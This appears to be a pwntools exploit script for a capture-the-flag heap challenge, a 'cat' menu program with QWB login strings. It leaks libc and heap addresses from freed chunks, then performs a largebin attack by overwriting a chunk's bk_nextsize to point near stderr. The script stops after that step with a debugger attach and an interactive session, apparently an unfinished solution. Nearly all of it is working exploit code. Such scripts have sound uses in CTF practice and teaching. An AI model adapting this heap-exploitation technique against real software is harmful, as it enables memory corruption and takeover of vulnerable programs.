from pwn import *
context.log_level="debug"
context.arch="amd64"
sh=process("./pwn")
def firstinit():
    payload=b"LOGIN | r00t QWB QWXFadmin"
    sh.sendafter(b'mew mew mew~~~~~~\n',payload)
def cmd(c):
    payload=b"CAT | r00t QWB QWXF$"+p32(0x0FFFFFFFF)
    sh.sendafter(b'mew mew mew~~~~~~\n',payload)
    sh.sendlineafter(b'plz input your cat choice:\n', str(c).encode())
def add(idx,size,ctt):
    cmd(1)
    sh.sendlineafter(b"plz input your cat idx:\n",str(idx).encode())
    sh.sendlineafter(b"plz input your cat size:\n",str(size).encode()) #0x417<size<0x46f
    sh.sendlineafter(b"plz input your content:\n",ctt)
def dele(idx):
    cmd(2)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
def show(idx):
    cmd(3)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
def edit(idx,ctt):
    cmd(4)
    sh.sendlineafter(b"plz input your cat idx:\n", str(idx).encode())
    sh.sendlineafter(b"plz input your content:\n", ctt)

firstinit()
#泄漏堆地址&libc地址
add(0,0x428,b'a')
add(1,0x420,b'b')
add(2,0x418,b'c')
add(3,0x420,b'd')
dele(0)
dele(2)
show(0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
sh.recv(2)
leak_heap=u64(sh.recv(8))
success("leak_heap:"+hex(leak_heap))
libcbase=leak_libc-0x219ce0
heapbase=(leak_heap>>12)<<12
success("libcbase:"+hex(libcbase))
success("heapbase:"+hex(heapbase))
#泄漏完毕
libc=ELF("./libc.so.6")
largebin_fd=libcbase+0x21a0d0
chunk0_addr=heapbase+0x290
stderr=libcbase+libc.sym['stderr']
add(4,0x428,b'a') #4->0
add(5,0x418,b'c') #5->2
gdb.attach(sh)
dele(4)
add(6,0x430,b'pad') #send chunk4 to largebin
edit(4,p64(largebin_fd)*2+p64(chunk0_addr)+p64(stderr-0x20)) #修改chunk4的bk_nextsize
dele(5)
add(7,0x430,b'pad2') #send chunk4 to largebin
sh.interactive()